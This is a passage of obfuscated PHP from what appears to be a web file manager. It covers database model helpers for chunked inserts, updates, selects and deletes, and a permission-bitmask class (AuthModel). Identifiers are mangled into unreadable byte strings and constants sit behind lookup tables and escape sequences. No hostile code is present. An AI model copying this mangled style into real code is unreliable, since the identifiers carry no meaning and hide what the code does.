$˜èî‰¤ü, $Õëµ«·[95] => $¡ûµ‰Œò, $Õëµ«·[451] => $¢Ï™ˆÖ¡); } $ø‹õŒª = $Õëµ«·[452] . $ğØğöĞÖ; CacheLock::lock($ø‹õŒª); $´Òšè£İ->where(array($µŒŠ‰’™ => $˜èî‰¤ü))->addAll($îÁ›, array(), !0); CacheLock::unlock($ø‹õŒª); return !0; } public function metaGet($ûƒ¿ğšÑ, $Ê©…°Ôù = false) { $¼³‹ŠŞÊ =& $_SERVER[ïÃ°£«Ê]; if (!$this->tableMeta) { return array(); } $½ƒõÇå = $this->tableMeta[$¼³‹ŠŞÊ[448]]; $øÙ•şÌ… = Model($this->tableMeta[$¼³‹ŠŞÊ[449]]); if ($Ê©…°Ôù) { $ÃŒİ“ÀÄ = array($½ƒõÇå => $ûƒ¿ğšÑ, $¼³‹ŠŞÊ[95] => $Ê©…°Ôù); return $øÙ•şÌ…->where($ÃŒİ“ÀÄ)->getField($¼³‹ŠŞÊ[451]); } $ÃŒİ“ÀÄ = array($½ƒõÇå => $ûƒ¿ğšÑ); $»ì½õ“› = $øÙ•şÌ…->field($¼³‹ŠŞÊ[453])->where($ÃŒİ“ÀÄ)->select(); $»ì½õ“› = array_to_keyvalue($»ì½õ“›, $¼³‹ŠŞÊ[95], $¼³‹ŠŞÊ[451]); return $»ì½õ“›; } private function checkDataAutoHas($ˆ´£±¿Ä) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $”ø¿±Â´) { if (in_array($ˆ´£±¿Ä, explode($_SERVER[ïÃ°£«Ê][50], $”ø¿±Â´[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$àÜàÜ¶, $½úØ£¶˜) { $ËØŒàÉÎ =& $_SERVER[ïÃ°£«Ê]; if (!is_array($àÜàÜ¶)) { return; } foreach ($this->dataAuto as $…´ÀãŸ—) { $ãĞ€»ÚÏ = $…´ÀãŸ—[0]; if (!in_array($½úØ£¶˜, explode($ËØŒàÉÎ[50], $…´ÀãŸ—[2]))) { continue; } switch (trim($…´ÀãŸ—[3])) { case $ËØŒàÉÎ[396]: case $ËØŒàÉÎ[397]: $êÔÕ¾ì = $…´ÀãŸ—[1]; $æ–ÙÛÚã = isset($…´ÀãŸ—[4]) ? (array) $…´ÀãŸ—[4] : array(); if ($êÔÕ¾ì == $ËØŒàÉÎ[204] && array_key_exists($ãĞ€»ÚÏ, $àÜàÜ¶)) { if (!$àÜàÜ¶[$ãĞ€»ÚÏ]) { unset($àÜàÜ¶[$ãĞ€»ÚÏ]); } break; } if (isset($àÜàÜ¶[$ãĞ€»ÚÏ])) { array_unshift($æ–ÙÛÚã, $àÜàÜ¶[$ãĞ€»ÚÏ]); } if ($ËØŒàÉÎ[396] == $…´ÀãŸ—[3]) { $àÜàÜ¶[$ãĞ€»ÚÏ] = call_user_func_array($êÔÕ¾ì, $æ–ÙÛÚã); } else { $àÜàÜ¶[$ãĞ€»ÚÏ] = call_user_func_array(array(&$this, $êÔÕ¾ì), $æ–ÙÛÚã); } break; case $ËØŒàÉÎ[348]: if (isset($àÜàÜ¶[$ãĞ€»ÚÏ]) && $àÜàÜ¶[$ãĞ€»ÚÏ]) { $àÜàÜ¶[$ãĞ€»ÚÏ] = call_user_func_array(array(&$this, $…´ÀãŸ—[1]), array($àÜàÜ¶[$ãĞ€»ÚÏ])); } break; case $ËØŒàÉÎ[351]: $àÜàÜ¶[$ãĞ€»ÚÏ] = $àÜàÜ¶[$…´ÀãŸ—[1]]; break; case $ËØŒàÉÎ[369]: if (isset($àÜàÜ¶[$ãĞ€»ÚÏ]) && !is_string($àÜàÜ¶[$ãĞ€»ÚÏ])) { $àÜàÜ¶[$ãĞ€»ÚÏ] = json_encode_force($àÜàÜ¶[$ãĞ€»ÚÏ]); $àÜàÜ¶[$ãĞ€»ÚÏ] = self::textEncode($àÜàÜ¶[$ãĞ€»ÚÏ]); } break; case $ËØŒàÉÎ[398]: if ($àÜàÜ¶[$ãĞ€»ÚÏ] === $ËØŒàÉÎ[12]) { unset($àÜàÜ¶[$ãĞ€»ÚÏ]); } break; case $ËØŒàÉÎ[399]: $àÜàÜ¶[$ãĞ€»ÚÏ] = $…´ÀãŸ—[1]; default: break; } } if ($½úØ£¶˜ == $ËØŒàÉÎ[430]) { $Æô½êÁÚ = strtolower($this->db->getDbType()); if (strpos($Æô½êÁÚ, $ËØŒàÉÎ[13]) !== 0) { return; } $ˆ–ğû»¢ = $this->field(!0)->fields; $©®¼÷´ = $ˆ–ğû»¢[$ËØŒàÉÎ[329]]; if (isset($ˆ–ğû»¢[$ËØŒàÉÎ[328]])) { unset($©®¼÷´[$ˆ–ğû»¢[$ËØŒàÉÎ[328]]]); } foreach ($©®¼÷´ as $ì›Îø”Á => $½úØ£¶˜) { if (!isset($àÜàÜ¶[$ì›Îø”Á])) { $àÜàÜ¶[$ì›Îø”Á] = $ËØŒàÉÎ[12]; } } } } private function dataAfterFilter(&$ÍÆ‘ÏÓÌ) { $“ÑËğí =& $_SERVER[ïÃ°£«Ê]; foreach ($this->dataAuto as $µ¹„çşì) { $–†²ìø¶ = $µ¹„çşì[0]; if (!isset($ÍÆ‘ÏÓÌ[$–†²ìø¶])) { continue; } if (!in_array($“ÑËğí[432], explode($“ÑËğí[50], $µ¹„çşì[2]))) { continue; } switch (trim($µ¹„çşì[3])) { case $“ÑËğí[396]: case $“ÑËğí[397]: $ÇÊæ±¯š = isset($µ¹„çşì[4]) ? (array) $µ¹„çşì[4] : array(); array_unshift($ÇÊæ±¯š, $ÍÆ‘ÏÓÌ[$–†²ìø¶]); if (isset($µ¹„çşì[4]) && $µ¹„çşì[4] == $“ÑËğí[454]) { $ÇÊæ±¯š = array($ÍÆ‘ÏÓÌ[$–†²ìø¶]); } if ($“ÑËğí[396] == $µ¹„çşì[3]) { $ÍÆ‘ÏÓÌ[$–†²ìø¶] = call_user_func_array($µ¹„çşì[1], $ÇÊæ±¯š); } else { $ÍÆ‘ÏÓÌ[$–†²ìø¶] = call_user_func_array(array(&$this, $µ¹„çşì[1]), $ÇÊæ±¯š); } break; case $“ÑËğí[348]: if (isset($ÍÆ‘ÏÓÌ[$–†²ìø¶]) && $ÍÆ‘ÏÓÌ[$–†²ìø¶]) { $ÍÆ‘ÏÓÌ[$–†²ìø¶] = call_user_func_array(array(&$this, $µ¹„çşì[1]), array($ÍÆ‘ÏÓÌ[$–†²ìø¶])); } break; case $“ÑËğí[351]: $ÍÆ‘ÏÓÌ[$–†²ìø¶] = $ÍÆ‘ÏÓÌ[$µ¹„çşì[1]]; break; case $“ÑËğí[369]: $´šÙÛ‡É = $ÍÆ‘ÏÓÌ[$–†²ìø¶]; $´šÙÛ‡É = self::textDecode($´šÙÛ‡É); $ÍÆ‘ÏÓÌ[$–†²ìø¶] = json_decode($´šÙÛ‡É, !0); if (is_null($ÍÆ‘ÏÓÌ[$–†²ìø¶])) { $ÍÆ‘ÏÓÌ[$–†²ìø¶] = $´šÙÛ‡É; } break; case $“ÑËğí[398]: if ($ÍÆ‘ÏÓÌ[$–†²ìø¶] === $“ÑËğí[12]) { unset($ÍÆ‘ÏÓÌ[$–†²ìø¶]); } break; case $“ÑËğí[399]: $ÍÆ‘ÏÓÌ[$–†²ìø¶] = $µ¹„çşì[1]; break; default: break; } } } public function saveAll($ƒ²¹ˆ“½, $éªÎ‰¦Ï = false) { $­ã’ÛŞÃ =& $_SERVER[ïÃ°£«Ê]; $ÜÕ¾è·¾ = $this->db; $‡Ñ£™ö° = $this->tablePrefix . $this->tableName; $­é÷î = $this->saveAllChunkMake($ƒ²¹ˆ“½); $éªÎ‰¦Ï = is_array($éªÎ‰¦Ï) ? $éªÎ‰¦Ï : array(); foreach ($­é÷î as $üãÓäµÏ) { $Â»©ïÍŒ = $­ã’ÛŞÃ[12]; $èâ…ŠÉ = $­ã’ÛŞÃ[12]; $ÂÁ¦Ğñ = array(); $üÈü›– = array(); foreach ($üãÓäµÏ as $“ªÒ­öã => $…æ›Á©ã) { $Â»©ïÍŒ = $…æ›Á©ã[$­ã’ÛŞÃ[455]]; $üÈü›–[] = $…æ›Á©ã[$­ã’ÛŞÃ[456]]; $˜öÓÜıá = $ÜÕ¾è·¾->parseValue($…æ›Á©ã[$­ã’ÛŞÃ[456]]); foreach ($…æ›Á©ã[$­ã’ÛŞÃ[457]] as $´Û«¾øÔ => $¬‘ƒÎÓ‚) { if (!$ÂÁ¦Ğñ[$´Û«¾øÔ]) { $ÂÁ¦Ğñ[$´Û«¾øÔ] = array(); } $ÂÁ¦Ğñ[$´Û«¾øÔ][] = $­ã’ÛŞÃ[458] . $˜öÓÜıá . $­ã’ÛŞÃ[459] . $ÜÕ¾è·¾->parseValue($¬‘ƒÎÓ‚); } } $õÄ”•“¬ = $Â»©ïÍŒ; $õÄ”•“¬ = $ÜÕ¾è·¾->parseKey($õÄ”•“¬); foreach ($ÂÁ¦Ğñ as $´Û«¾øÔ => $Š¦ßŞç¢) { $èâ…ŠÉ .= $­ã’ÛŞÃ[285] . $ÜÕ¾è·¾->parseKey($´Û«¾øÔ) . $­ã’ÛŞÃ[460] . $õÄ”•“¬ . $­ã’ÛŞÃ[461]; $èâ…ŠÉ .= implode($­ã’ÛŞÃ[285], $Š¦ßŞç¢) . $­ã’ÛŞÃ[462]; } $Ô‰ğşâŒ = $éªÎ‰¦Ï; $Ô‰ğşâŒ[$Â»©ïÍŒ] = array($­ã’ÛŞÃ[7], $üÈü›–); $õ°Ë´Íè = "\125\120\104\x41\124\x45\x20\140{$‡Ñ£™ö°}\140\x20\123\x45\124\40" . rtrim($èâ…ŠÉ, $­ã’ÛŞÃ[50]) . $­ã’ÛŞÃ[285] . $ÜÕ¾è·¾->parseWhere($Ô‰ğşâŒ); $this->execute($õ°Ë´Íè); $this->chunkEventCheck(count($üãÓäµÏ)); } $this->chunkEventSet(); } public function saveAllEach($Ú¿“Ï¼À, $†ÂæğĞ… = false) { $ê’ğ¢§ =& $_SERVER[ïÃ°£«Ê]; $½”ÍÔŞ» = $this->db; $«—ÎÓÈ = $this->tablePrefix . $this->tableName; $¤ª¤ÜÕœ = $this->saveAllChunkMake($Ú¿“Ï¼À); $†ÂæğĞ… = is_array($†ÂæğĞ…) ? $†ÂæğĞ… : array(); foreach ($¤ª¤ÜÕœ as $¿Œè®Í•) { foreach ($¿Œè®Í• as $¤®ÖÓ…’ => $ç†·ÖÇ©) { $ü˜—Å¢Ì = $ê’ğ¢§[463]; foreach ($ç†·ÖÇ©[$ê’ğ¢§[457]] as $§äÁ·Ğ— => $ëİ¥‘İ) { $ü˜—Å¢Ì .= $½”ÍÔŞ»->parseKey($§äÁ·Ğ—) . $ê’ğ¢§[464] . $½”ÍÔŞ»->parseValue($ëİ¥‘İ) . $ê’ğ¢§[50]; } $ìÔ·Ç–¢ = $†ÂæğĞ…; $ìÔ·Ç–¢[$ç†·ÖÇ©[$ê’ğ¢§[455]]] = $ç†·ÖÇ©[$ê’ğ¢§[456]]; $şÓ‰ÕŞÊ = "\125\120\x44\101\124\x45\40\x60{$«—ÎÓÈ}\x60\40\x53\x45\x54\40" . rtrim($ü˜—Å¢Ì, $ê’ğ¢§[50]) . $ê’ğ¢§[465] . $½”ÍÔŞ»->parseWhere($ìÔ·Ç–¢) . $ê’ğ¢§[466]; $this->execute($şÓ‰ÕŞÊ); } $this->chunkEventCheck(count($¿Œè®Í•)); } $this->chunkEventSet(); } private function saveAllChunkMake($·ìÊ«÷ß) { $ƒÇúü«ö =& $_SERVER[ïÃ°£«Ê]; $±¿ø˜Èğ = self::SQL_WHERE_IN_CHUNK; $·ìÊ«÷ß = is_array($·ìÊ«÷ß) ? $·ìÊ«÷ß : array(); $„Àè”ğÏ = array(); $÷ïğ üö = ceil(count($·ìÊ«÷ß) / $±¿ø˜Èğ); for ($•×¼“® = 0; $•×¼“® < $÷ïğ üö; $•×¼“®++) { $ÁÚ„øÆ = array(); $éá½¬ìÔ = array_slice($·ìÊ«÷ß, $•×¼“® * $±¿ø˜Èğ, $±¿ø˜Èğ); foreach ($éá½¬ìÔ as $àÍÕ¦şª) { if (!is_array($àÍÕ¦şª) || count($àÍÕ¦şª) < 4 || count($àÍÕ¦şª) % 2 != 0) { continue; } $Ğ¼şÙÁ³ = array(); for ($‡¿¡£Õ = 2; $‡¿¡£Õ < count($àÍÕ¦şª); $‡¿¡£Õ += 2) { $Ğ¼şÙÁ³[$àÍÕ¦şª[$‡¿¡£Õ]] = $àÍÕ¦şª[$‡¿¡£Õ + 1]; } $ÁÚ„øÆ[] = array($ƒÇúü«ö[455] => $àÍÕ¦şª[0], $ƒÇúü«ö[456] => $àÍÕ¦şª[1], $ƒÇúü«ö[457] => $Ğ¼şÙÁ³); } $„Àè”ğÏ[] = $ÁÚ„øÆ; } return $„Àè”ğÏ; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ûğÇŠÖ = false, $Ÿ‹¨ƒØï = false) { $this->_chunkEvent = $ûğÇŠÖ; $this->_chunkEventParam = $Ÿ‹¨ƒØï; } private function chunkEventCheck($Ì®ÃÕ¬) { if (!$this->_chunkEvent) { return; } $íÕ˜¼İ— = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $íÕ˜¼İ—[$_SERVER[ïÃ°£«Ê][467]] = $Ì®ÃÕ¬; Hook::trigger($this->_chunkEvent, $íÕ˜¼İ—); } public function addAll($àıÏªÜŠ, $Ş™Ÿõ£¢ = array(), $ˆ­Ö²÷ = false) { $í²øÑ®ô =& $_SERVER[ïÃ°£«Ê]; ignore_timeout(); $Æ‚åÙ ì = self::SQL_WHERE_IN_CHUNK; if (empty($àıÏªÜŠ)) { $this->error = think_lang($í²øÑ®ô[349]); return !1; } $Ş™Ÿõ£¢ = $this->_parseOptions($Ş™Ÿõ£¢); foreach ($àıÏªÜŠ as $°œµ…„ => $ÏÒæ³òø) { $àıÏªÜŠ[$°œµ…„] = $this->_facade($ÏÒæ³òø); $this->_beforeInsert($àıÏªÜŠ[$°œµ…„], $Ş™Ÿõ£¢); } if (method_exists($this->db, $í²øÑ®ô[350])) { for ($æ†ÊñË  = 0; $æ†ÊñË  < count($àıÏªÜŠ); $æ†ÊñË  += $Æ‚åÙ ì) { $â§Ù¯ƒÙ = array_slice($àıÏªÜŠ, $æ†ÊñË , $Æ‚åÙ ì); if (!is_array($â§Ù¯ƒÙ) || count($â§Ù¯ƒÙ) == 0) { break; } $ªÁãæ€Ú = $this->db->insertAll($â§Ù¯ƒÙ, $Ş™Ÿõ£¢, $ˆ­Ö²÷); $this->chunkEventCheck(count($â§Ù¯ƒÙ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($àıÏªÜŠ as $°œµ…„ => $ÏÒæ³òø) { $ªÁãæ€Ú = $this->db->insert($ÏÒæ³òø, $Ş™Ÿõ£¢, $ˆ­Ö²÷); } $this->commit(); } if (!1 !== $ªÁãæ€Ú) { $—±Ôñ´ü = $this->getLastInsID(); if ($—±Ôñ´ü) { return $—±Ôñ´ü; } } return $ªÁãæ€Ú; } public function save($Ü¡¥ï« = '', $™•üÍ†… = array()) { $æú®·‘õ =& $_SERVER[ïÃ°£«Ê]; $‹ÇÀ‘Ê = self::SQL_WHERE_IN_CHUNK; $øšŠçÂ¢ = $this->optionsValue(); $¦•Á¡˜û = $this->findWhereField($øšŠçÂ¢); if (!$¦•Á¡˜û) { return parent::save($Ü¡¥ï«, $™•üÍ†…); } $ŠÔ”¡Øğ = 0; $‰×±òØ€ = $øšŠçÂ¢[$æú®·‘õ[353]][$¦•Á¡˜û][1]; $‰×±òØ€ = is_array($‰×±òØ€) ? $‰×±òØ€ : array(); $½í«™ğº = count($‰×±òØ€); for ($Ûë„öêç = 0; $Ûë„öêç < $½í«™ğº; $Ûë„öêç += $‹ÇÀ‘Ê) { $†„–Üæ = array_slice($‰×±òØ€, $Ûë„öêç, $‹ÇÀ‘Ê); if (!is_array($†„–Üæ) || count($†„–Üæ) == 0) { break; } $øšŠçÂ¢[$æú®·‘õ[353]][$¦•Á¡˜û][1] = $†„–Üæ; $this->optionsValue($øšŠçÂ¢); $ŠÔ”¡Øğ += parent::save($Ü¡¥ï«, $™•üÍ†…); $this->chunkEventCheck(count($†„–Üæ)); } $this->chunkEventSet(); return $ŠÔ”¡Øğ; } public function add($¯å­÷ËÎ = '', $ı‰Ã = array(), $ŸÚªºØ = false) { if ($this->addTaskStatus && is_array($¯å­÷ËÎ)) { $this->addTaskData[] = $¯å­÷ËÎ; return; } return parent::add($¯å­÷ËÎ, $ı‰Ã, $ŸÚªºØ); } public function parseWhereLike($ı…¿Ó¢°, $—ş¸ßĞî = '', $ı€‘ÅŒé = false, &$¤¾©¯¶Š = false) { $“‰Öü‰° =& $_SERVER[ïÃ°£«Ê]; $È¹ÏİÖç = $GLOBALS[$“‰Öü‰°[6]][$“‰Öü‰°[468]]; if (!$È¹ÏİÖç[$“‰Öü‰°[469]]) { return $ı…¿Ó¢°; } if (!in_array($this->tableName, array($“‰Öü‰°[429], $“‰Öü‰°[470], $“‰Öü‰°[471], $“‰Öü‰°[472]))) { return $ı…¿Ó¢°; } if (!is_array($ı…¿Ó¢°)) { return $ı…¿Ó¢°; } $¿ñ‚¶” = array(); $Ûâ·Ôûõ = 0; foreach ($ı…¿Ó¢° as $ä©•Ğİü => $†®ñˆË) { if (is_array($†®ñˆË) && count($†®ñˆË) == 2 && $†®ñˆË[0] == $“‰Öü‰°[473] && is_string($†®ñˆË[1]) && substr($†®ñˆË[1], 0, 1) == $“‰Öü‰°[474] && substr($†®ñˆË[1], strlen($†®ñˆË[1]) - 1, 1) == $“‰Öü‰°[474]) { $¤¾©¯¶Š = !0; $ĞíËÕï = is_string($ä©•Ğİü) ? $ä©•Ğİü : $—ş¸ßĞî; $ğ˜²ê…à = substr($†®ñˆË[1], 1, strlen($†®ñˆË[1]) - 2); $ğ˜²ê…à = $this->db->escapeString($ğ˜²ê…à); if (!strpos($ĞíËÕï, $“‰Öü‰°[10])) { $ĞíËÕï = $“‰Öü‰°[475] . $ĞíËÕï . $“‰Öü‰°[475]; } $€éµ‹Šø = $“‰Öü‰°[220] . $ğ˜²ê…à . $“‰Öü‰°[220]; $ğ˜²ê…à = str_replace(array($“‰Öü‰°[10], $“‰Öü‰°[476]), $“‰Öü‰°[477], $ğ˜²ê…à); if ($È¹ÏİÖç[$“‰Öü‰°[478]]) { $€éµ‹Šø = $“‰Öü‰°[479] . $ğ˜²ê…à . $“‰Öü‰°[480]; if ($È¹ÏİÖç[$“‰Öü‰°[481]]) { $€éµ‹Šø = $“‰Öü‰°[480] . $ğ˜²ê…à . $“‰Öü‰°[479]; } } $‡àß¢˜Ó = Hook::trigger($“‰Öü‰°[482], $ğ˜²ê…à, $€éµ‹Šø); if ($‡àß¢˜Ó) { $€éµ‹Šø = $‡àß¢˜Ó; } $¿ñ‚¶”[$Ûâ·Ôûõ] = $“‰Öü‰°[483] . $ĞíËÕï . $“‰Öü‰°[484] . $€éµ‹Šø . $“‰Öü‰°[485]; $Ûâ·Ôûõ++; continue; } if (is_array($†®ñˆË)) { $—ş¸ßĞî = is_string($ä©•Ğİü) ? $ä©•Ğİü : $—ş¸ßĞî; $†®ñˆË = $this->parseWhereLike($†®ñˆË, $—ş¸ßĞî, !0, $¤¾©¯¶Š); } if (is_numeric($ä©•Ğİü)) { $¿ñ‚¶”[$Ûâ·Ôûõ] = $†®ñˆË; $Ûâ·Ôûõ++; } else { $¿ñ‚¶”[$ä©•Ğİü] = $†®ñˆË; } } if ($¤¾©¯¶Š && !$ı€‘ÅŒé) { } return $¿ñ‚¶”; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ÖËíÎÖ² = array()) { $Òè¦¸’ó =& $_SERVER[ïÃ°£«Ê]; $ÓôÓÉÇ• = self::SQL_WHERE_IN_CHUNK; $±ô—Áô‰ = $this->optionsValue(); $ÆŸà…äÜ = $this->findWhereField($±ô—Áô‰); if (!$ÆŸà…äÜ || isset($±ô—Áô‰[$Òè¦¸’ó[368]]) || isset($±ô—Áô‰[$Òè¦¸’ó[428]])) { return parent::select($ÖËíÎÖ²); } $ÒïæÓíê = $±ô—Áô‰[$Òè¦¸’ó[353]][$ÆŸà…äÜ][1]; $ÒïæÓíê = is_array($ÒïæÓíê) ? $ÒïæÓíê : array(); $àğ­ˆå— = null; for ($¦’Ü„éÇ = 0; $¦’Ü„éÇ < count($ÒïæÓíê); $¦’Ü„éÇ += $ÓôÓÉÇ•) { $Ùëİ†µ‚ = array_slice($ÒïæÓíê, $¦’Ü„éÇ, $ÓôÓÉÇ•); if (!is_array($Ùëİ†µ‚) || count($Ùëİ†µ‚) == 0) { break; } $±ô—Áô‰[$Òè¦¸’ó[353]][$ÆŸà…äÜ][1] = $Ùëİ†µ‚; $this->optionsValue($±ô—Áô‰); $¦ÓŸÂ‚È = parent::select($ÖËíÎÖ²); if (!$¦ÓŸÂ‚È) { continue; } $àğ­ˆå— = is_array($àğ­ˆå—) ? $àğ­ˆå— : array(); $àğ­ˆå— = array_merge($àğ­ˆå—, $¦ÓŸÂ‚È); } return $àğ­ˆå—; } public function delete($¡Ãº±£‘ = array()) { $Â¥Åƒíó =& $_SERVER[ïÃ°£«Ê]; $ïé™Ù¥ = self::SQL_WHERE_IN_CHUNK; $ÆõéØ¶¹ = $this->optionsValue(); $ñ”¹·¯ = $this->findWhereField($ÆõéØ¶¹); if (!$ñ”¹·¯) { return parent::delete($¡Ãº±£‘); } $ ç…¤àõ = 0; $«üüõõ¶ = $ÆõéØ¶¹[$Â¥Åƒíó[353]][$ñ”¹·¯][1]; $«üüõõ¶ = is_array($«üüõõ¶) ? $«üüõõ¶ : array(); for ($İàóù¢Í = 0; $İàóù¢Í < count($«üüõõ¶); $İàóù¢Í += $ïé™Ù¥) { $“¢İÊß¯ = array_slice($«üüõõ¶, $İàóù¢Í, $ïé™Ù¥); if (!is_array($“¢İÊß¯) || count($“¢İÊß¯) == 0) { break; } $ÆõéØ¶¹[$Â¥Åƒíó[353]][$ñ”¹·¯][1] = $“¢İÊß¯; $this->optionsValue($ÆõéØ¶¹); $ ç…¤àõ += parent::delete($¡Ãº±£‘); } return $ ç…¤àõ; } private function findWhereField($Ãëßôşè) { $Å¸ª¢åã =& $_SERVER[ïÃ°£«Ê]; $¨‡äÏğ¹ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Ãëßôşè) || !is_array($Ãëßôşè[$Å¸ª¢åã[353]])) { return !1; } foreach ($Ãëßôşè[$Å¸ª¢åã[353]] as $µïÑ •í => $ì³®àï…) { if (is_array($ì³®àï…) && isset($ì³®àï…[0]) && is_string($ì³®àï…[0]) && strtolower($ì³®àï…[0]) == $Å¸ª¢åã[7] && is_array($ì³®àï…[1]) && count($ì³®àï…[1]) > $¨‡äÏğ¹) { ignore_timeout(); return $µïÑ •í; } } return !1; } public function setMasterDB($‹²‘—¦£ = true) { think_config($_SERVER[ïÃ°£«Ê][486], $‹²‘—¦£); } } goto d§¼’Éé‡È; A¨Êõò“…å: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $÷õıÌ Ã =& $_SERVER[ïÃ°£«Ê]; $“‰ÅßÑ• = array(array($÷õıÌ Ã[509] => LNG($÷õıÌ Ã[2186]), $÷õıÌ Ã[2187] => $÷õıÌ Ã[2188], $÷õıÌ Ã[2189] => 1, $÷õıÌ Ã[2190] => 1, $÷õıÌ Ã[2191] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($÷õıÌ Ã[509] => LNG($÷õıÌ Ã[2192]), $÷õıÌ Ã[2187] => $÷õıÌ Ã[2193], $÷õıÌ Ã[2189] => 2, $÷õıÌ Ã[2190] => 1, $÷õıÌ Ã[2191] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($÷õıÌ Ã[509] => LNG($÷õıÌ Ã[2194]), $÷õıÌ Ã[2187] => $÷õıÌ Ã[2195], $÷õıÌ Ã[2189] => 3, $÷õıÌ Ã[2190] => 1, $÷õıÌ Ã[2191] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($÷õıÌ Ã[509] => LNG($÷õıÌ Ã[2196]), $÷õıÌ Ã[2187] => $÷õıÌ Ã[2197], $÷õıÌ Ã[2189] => 4, $÷õıÌ Ã[2190] => 1, $÷õıÌ Ã[2191] => self::AUTH_SHOW | self::AUTH_VIEW), array($÷õıÌ Ã[509] => LNG($÷õıÌ Ã[2198]), $÷õıÌ Ã[2187] => $÷õıÌ Ã[2199], $÷õıÌ Ã[2189] => 5, $÷õıÌ Ã[2190] => 1, $÷õıÌ Ã[2191] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($÷õıÌ Ã[509] => LNG($÷õıÌ Ã[2200]), $÷õıÌ Ã[2187] => $÷õıÌ Ã[2201], $÷õıÌ Ã[2189] => 6, $÷õıÌ Ã[2190] => 1, $÷õıÌ Ã[2191] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($÷õıÌ Ã[509] => LNG($÷õıÌ Ã[2202]), $÷õıÌ Ã[2187] => $÷õıÌ Ã[2203], $÷õıÌ Ã[2189] => 7, $÷õıÌ Ã[2190] => 1, $÷õıÌ Ã[2191] => 0)); return $“‰ÅßÑ•; } public static function authCheck($üé‡¶Â‰, $£¿÷ñ«, $Ë§éù×í = true) { $¼¯•ìÂİ =& $_SERVER[ïÃ°£«Ê]; $üé‡¶Â‰ = intval($üé‡¶Â‰); if ($Ë§éù×í) { if (KodUser::isRoot() && $GLOBALS[$¼¯•ìÂİ[6]][$¼¯•ìÂİ[2204]]) { return !0; } } if ($üé‡¶Â‰ <= 0) { return !1; } if (($üé‡¶Â‰ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($üé‡¶Â‰ & $£¿÷ñ«); } public static function authCheckShow($¢†ŸæÂã) { return self::authCheck($¢†ŸæÂã, self::AUTH_SHOW); } public static function authCheckView($İ÷×ç¶±) { return self::authCheck($İ÷×ç¶±, self::AUTH_VIEW); } public static function authCheckDownload($àƒ†Ş÷‰) { return self::authCheck($àƒ†Ş÷‰, self::AUTH_DOWNLOAD); } public static function authCheckUpload($‚üÙÏè) { return self::authCheck($‚üÙÏè, self::AUTH_UPLOAD); } public static function authCheckEdit($ÑÀ´óµØ) { return self::authCheck($ÑÀ´óµØ, self::AUTH_EDIT); } public static function authCheckRemove($ŒÊ«šºæ) { return self::authCheck($ŒÊ«šºæ, self::AUTH_REMOVE); } public static function authCheckShare($ÙÌ÷Ú¥û) { return self::authCheck($ÙÌ÷Ú¥û, self::AUTH_SHARE); } public static function authCheckComment($ åáº¢­) { return self::authCheck($ åáº¢­, self::AUTH_COMMENT); } public static function authCheckEvent($ö¯ËËËİ) { return self::authCheck($ö¯ËËËİ, self::AUTH_EVENT); } public static function authCheckRoot($™¬ø¿ĞÙ) { return self::authCheck($™¬ø¿ĞÙ, self::AUTH_ROOT); } public static function authCheckAction($ÛÁ†•‡û, $õıÄÖß¸) { $•­³Ïç¾ =& $_SERVER[ïÃ°£«Ê]; $•”ÑÄÎ = array($•­³Ïç¾[1561] => self::AUTH_SHOW, $•­³Ïç¾[1562] => self::AUTH_VIEW, $•­³Ïç¾[1387] => self::AUTH_DOWNLOAD, $•­³Ïç¾[107] => self::AUTH_UPLOAD, $•­³Ïç¾[1563] => self::AUTH_EDIT, $•­³Ïç¾[1336] => self::AUTH_REMOVE, $•­³Ïç¾[1564] => self::AUTH_SHARE, $•­³Ïç¾[429] => self::AUTH_COMMENT, $•­³Ïç¾[1565] => self::AUTH_EVENT, $•­³Ïç¾[1566] => self::AUTH_ROOT); if (!isset($•”ÑÄÎ[$õıÄÖß¸])) { return; } $³ã¼®Î = $•”ÑÄÎ[$õıÄÖß¸]; $ÛÁ†•‡û = intval($ÛÁ†•‡û); if ($ÛÁ†•‡û <= 0) { return !1; } if (($ÛÁ†•‡û & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÛÁ†•‡û & $³ã¼®Î); } public static function authDisable($»¦­¥õ˜, $‚æÌ›Áë) { if (intval($»¦­¥õ˜) <= 0) { return 0; } return intval($»¦­¥õ˜) & ~$‚æÌ›Áë; } public $optionType = "\x53\171\163\x74\x65\155\x2e\163\x6f\x75\x72\x63\x65\101\x75\164\150\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\145", 